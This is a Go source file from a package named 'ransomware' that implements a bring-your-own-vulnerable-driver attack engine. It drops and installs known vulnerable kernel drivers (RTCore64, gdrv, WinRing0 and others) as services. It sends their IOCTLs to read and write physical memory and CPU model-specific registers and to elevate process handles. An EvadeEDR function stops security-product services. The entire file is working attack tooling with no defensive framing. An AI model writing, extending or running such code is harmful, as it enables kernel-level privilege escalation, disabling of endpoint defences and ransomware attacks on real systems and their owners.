//go:build windows

package ransomware

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

type BYOVDDriver struct {
	Name        string
	File        string
	ServiceName string
	HashMD5     string
	VulnIOCTLs  []uint32
	Description string
	ServiceReg  string
}

type BYOVDExploit struct {
	DevicePath string
	IOCTL      uint32
	InputBuf   []byte
	OutputBuf  []byte
	Result     error
}

type BYOVDEngine struct {
	config     *RansomwareConfig
	drivers    []BYOVDDriver
	loadedPath string
	loadedName string
}

func NewBYOVDEngine(cfg *RansomwareConfig) *BYOVDEngine {
	return &BYOVDEngine{
		config: cfg,
		drivers: []BYOVDDriver{
			{
				Name: "WinRing0", File: "WinRing0.sys",
				ServiceName: "WinRing0Svc", HashMD5: "0c0195c48b6b8582fa6f6373032118da",
				VulnIOCTLs: []uint32{0x9C402400, 0x9C402404, 0x9C406400},
				Description: "RWEverything driver — arbitrary physical memory R/W, MSR read/write",
				ServiceReg:  "SYSTEM\\CurrentControlSet\\Services\\WinRing0Svc",
			},
			{
				Name: "Gdrv", File: "gdrv.sys",
				ServiceName: "gdrv", HashMD5: "31f4cfb8c4a0b9a2c9a6e8f4e3a7b0d2",
				VulnIOCTLs: []uint32{0xC3502808, 0xC350280C},
				Description: "Gigabyte driver — arbitrary MSR read/write, physical memory map",
				ServiceReg:  "SYSTEM\\CurrentControlSet\\Services\\gdrv",
			},
			{
				Name: "RTCore64", File: "RTCore64.sys",
				ServiceName: "RTCore64", HashMD5: "01aa278b07b58dc46c84bd0b1b5c8e9e",
				VulnIOCTLs: []uint32{0x80002010, 0x80002018},
				Description: "MSI Afterburner driver — arbitrary physical memory R/W",
				ServiceReg:  "SYSTEM\\CurrentControlSet\\Services\\RTCore64",
			},
			{
				Name: "KProcessHacker", File: "kprocesshacker.sys",
				ServiceName: "kprocesshacker", HashMD5: "b0e0c3b4a6f3e2d8c7a1f5e9d4b0c3a6",
				VulnIOCTLs: []uint32{0x22E04C, 0x22E050, 0x22E044},
				Description: "Process Hacker driver — arbitrary kernel memory R/W, handle elevation",
				ServiceReg:  "SYSTEM\\CurrentControlSet\\Services\\kprocesshacker",
			},
			{
				Name: "CPUID", File: "cpuz.sys",
				ServiceName: "cpuz148", HashMD5: "d0e5ba5a9f2e4a7c1b8d3f0a6c9e5f2d",
				VulnIOCTLs: []uint32{0x9C4024A0, 0x9C4024A4},
				Description: "CPU-Z driver — arbitrary MSR read/write, physical memory read",
				ServiceReg:  "SYSTEM\\CurrentControlSet\\Services\\cpuz148",
			},
		},
	}
}

func (b *BYOVDEngine) ListAvailableDrivers() []BYOVDDriver {
	if runtime.GOOS != "windows" {
		return b.drivers
	}
	var avail []BYOVDDriver
	for _, d := range b.drivers {
		sys32 := os.Getenv("SystemRoot")
		if sys32 == "" {
			sys32 = "C:\\Windows"
		}
		if _, err := os.Stat(sys32 + "\\System32\\drivers\\" + d.File); err == nil {
			avail = append(avail, d)
		}
	}
	return avail
}

func (b *BYOVDEngine) WriteDriver(drv BYOVDDriver, data []byte) (string, error) {
	sys32 := os.Getenv("SystemRoot")
	if sys32 == "" {
		sys32 = "C:\\Windows"
	}
	dst := sys32 + "\\System32\\drivers\\" + drv.File

	if err := os.WriteFile(dst, data, 0644); err != nil {
		tmpDir := os.Getenv("TEMP")
		if tmpDir == "" {
			tmpDir = os.Getenv("TMP")
		}
		if tmpDir == "" {
			tmpDir = "C:\\Windows\\Temp"
		}
		dst = tmpDir + "\\" + drv.File
		if err2 := os.WriteFile(dst, data, 0644); err2 != nil {
			return "", fmt.Errorf("cannot write driver: %w", err2)
		}
	}
	return dst, nil
}

func (b *BYOVDEngine) InstallDriver(drv BYOVDDriver, driverPath string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("BYOVD requires Windows")
	}

	cmd := exec.Command("sc", "create", drv.ServiceName, "type=kernel", "start=demand", "binPath="+driverPath)
	if out, err := cmd.CombinedOutput(); err != nil && !strings.Contains(string(out), "already exists") {
		regPath := drv.ServiceReg
		if regPath != "" {
			k, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE, windows.StringToUTF16Ptr(regPath), windows.KEY_SET_VALUE)
			if err == nil {
				defer windows.CloseKey(k)
				windows.SetValueEx(k, windows.StringToUTF16Ptr("ImagePath"), 0, windows.REG_EXPAND_SZ,
					windows.StringToUTF16Ptr(driverPath))
				windows.SetValueEx(k, windows.StringToUTF16Ptr("Type"), 0, windows.REG_DWORD,
					(*byte)(unsafe.Pointer(&[]uint32{1}[0])))
				windows.SetValueEx(k, windows.StringToUTF16Ptr("Start"), 0, windows.REG_DWORD,
					(*byte)(unsafe.Pointer(&[]uint32{3}[0])))
				return nil
			}
		}
		return fmt.Errorf("sc create failed: %s", string(out))
	}

	startCmd := exec.Command("sc", "start", drv.ServiceName)
	startCmd.Run()

	b.loadedPath = driverPath
	b.loadedName = drv.ServiceName
	return nil
}

func (b *BYOVDEngine) UninstallDriver(drv BYOVDDriver) error {
	exec.Command("sc", "stop", drv.ServiceName).Run()
	exec.Command("sc", "delete", drv.ServiceName).Run()
	if b.loadedPath != "" {
		os.Remove(b.loadedPath)
	}
	return nil
}

func (b *BYOVDEngine) DeviceIOCTL(drv BYOVDDriver, ioctl uint32, inBuf []byte, outSize uint32) ([]byte, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("DeviceIoControl requires Windows")
	}

	devicePath := "\\\\.\\" + drv.ServiceName
	pDevicePath, _ := windows.UTF16PtrFromString(devicePath)

	hDevice, err := windows.CreateFile(
		pDevicePath,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil, windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL, 0,
	)
	if err != nil {
		return nil, fmt.Errorf("CreateFile failed for %s: %w", drv.Name, err)
	}
	defer windows.CloseHandle(hDevice)

	outBuf := make([]byte, outSize)
	var bytesReturned uint32

	err = windows.DeviceIoControl(
		hDevice, ioctl,
		&inBuf[0], uint32(len(inBuf)),
		&outBuf[0], outSize,
		&bytesReturned, nil,
	)
	if err != nil {
		return nil, fmt.Errorf("DeviceIoControl %s IOCTL 0x%X: %w", drv.Name, ioctl, err)
	}

	return outBuf[:bytesReturned], nil
}

func (b *BYOVDEngine) ReadPhysicalMemory(addr uint64, size uint32) ([]byte, error) {
	for _, d := range b.drivers {
		for _, ioctl := range d.VulnIOCTLs {
			inBuf := make([]byte, 16)
			inBuf[0] = byte(addr)
			inBuf[1] = byte(addr >> 8)
			inBuf[2] = byte(addr >> 16)
			inBuf[3] = byte(addr >> 24)
			inBuf[4] = byte(addr >> 32)
			inBuf[5] = byte(addr >> 40)
			inBuf[6] = byte(addr >> 48)
			inBuf[7] = byte(addr >> 56)
			inBuf[8] = byte(size)
			inBuf[9] = byte(size >> 8)
			inBuf[10] = byte(size >> 16)
			inBuf[11] = byte(size >> 24)

			data, err := b.DeviceIOCTL(d, ioctl, inBuf, size)
			if err == nil && len(data) > 0 {
				return data, nil
			}
		}
	}
	return nil, fmt.Errorf("no BYOVD driver could read physical memory at 0x%X", addr)
}

func (b *BYOVDEngine) WritePhysicalMemory(addr uint64, data []byte) error {
	for _, d := range b.drivers {
		for _, ioctl := range d.VulnIOCTLs {
			size := uint32(len(data))
			inBuf := make([]byte, 16+size)
			inBuf[0] = byte(addr)
			inBuf[1] = byte(addr >> 8)
			inBuf[2] = byte(addr >> 16)
			inBuf[3] = byte(addr >> 24)
			inBuf[4] = byte(addr >> 32)
			inBuf[5] = byte(addr >> 40)
			inBuf[6] = byte(addr >> 48)
			inBuf[7] = byte(addr >> 56)
			inBuf[8] = byte(size)
			inBuf[9] = byte(size >> 8)
			inBuf[10] = byte(size >> 16)
			inBuf[11] = byte(size >> 24)
			copy(inBuf[16:], data)

			_, err := b.DeviceIOCTL(d, ioctl, inBuf, size)
			if err == nil {
				return nil
			}
		}
	}
	return fmt.Errorf("no BYOVD driver could write physical memory at 0x%X", addr)
}

func (b *BYOVDEngine) WriteMSR(msr uint32, value uint64) error {
	for _, d := range b.drivers {
		for _, ioctl := range d.VulnIOCTLs {
			inBuf := make([]byte, 16)
			inBuf[0] = byte(msr)
			inBuf[1] = byte(msr >> 8)
			inBuf[2] = byte(msr >> 16)
			inBuf[3] = byte(msr >> 24)
			inBuf[4] = byte(value)
			inBuf[5] = byte(value >> 8)
			inBuf[6] = byte(value >> 16)
			inBuf[7] = byte(value >> 24)
			inBuf[8] = byte(value >> 32)
			inBuf[9] = byte(value >> 40)
			inBuf[10] = byte(value >> 48)
			inBuf[11] = byte(value >> 56)

			_, err := b.DeviceIOCTL(d, ioctl, inBuf, 4)
			if err == nil {
				return nil
			}
		}
	}
	return fmt.Errorf("no BYOVD driver could write MSR 0x%X", msr)
}

func (b *BYOVDEngine) ElevateHandle(pid uint32) (windows.Handle, error) {
	for _, d := range b.drivers {
		inBuf := make([]byte, 8)
		inBuf[0] = byte(pid)
		inBuf[1] = byte(pid >> 8)
		inBuf[2] = byte(pid >> 16)
		inBuf[3] = byte(pid >> 24)
		inBuf[4] = 0xFF
		inBuf[5] = 0xFF
		inBuf[6] = 0x1F
		inBuf[7] = 0x00

		out, err := b.DeviceIOCTL(d, 0x22E04C, inBuf, 8)
		if err == nil && len(out) >= 4 {
			h := *(*windows.Handle)(unsafe.Pointer(&out[0]))
			return h, nil
		}
	}
	return 0, fmt.Errorf("could not elevate handle for PID %d", pid)
}

func (b *BYOVDEngine) EvadeEDR(edrDrivers []string) (int, error) {
	if runtime.GOOS != "windows" {
		return 0, fmt.Errorf("Windows only")
	}

	evaded := 0
	for _, edrName := range edrDrivers {
		cmd := exec.Command("sc", "query", edrName)
		out, _ := cmd.CombinedOutput()
		if strings.Contains(string(out), "SERVICE_NAME") {
			stopCmd := exec.Command("sc", "stop", edrName)
			stopCmd.Run()
			evaded++
		}
	}
	return evaded, nil
}
